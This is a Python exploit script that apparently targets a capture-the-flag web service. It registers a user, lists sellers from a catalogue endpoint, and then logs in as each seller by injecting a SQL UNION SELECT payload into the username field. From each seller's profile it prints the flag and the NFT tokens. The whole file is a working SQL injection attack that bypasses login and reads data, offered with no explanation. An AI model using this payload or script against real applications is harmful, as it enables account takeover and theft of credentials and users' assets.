import sys
import requests

HOST = sys.argv[1]
PORT = '8080'
hint = sys.argv[2]
URL = f'http://{HOST}:{PORT}'

sqli_example = "notexist' UNION SELECT id, role, username, (SELECT password FROM users WHERE username = '%s') as password FROM users where username='%s'; --"

with requests.Session() as s:
    user = {"username" : hint, "password" : "123"}
    s.post(f'{URL}/api/v1/register', json=user)
    s.post(f'{URL}/api/v1/login', json=user)
    resp = s.post(f'{URL}/api/v1/catalogue', json={"page": 1, "limit" : 10})
with requests.Session() as s2: 
    for m in resp.json()["rows"]:
        user = {"username" : sqli_example % (hint, m["seller"]),
                "password" : "123"}
        resp = s2.post(f'{URL}/api/v1/login', json=user)
        resp = s2.get(f'{URL}/api/v1/profile')
        print(resp.json()["flag"])
        for i in resp.json()["merchandise"]:  
            print(i['NFTToken'])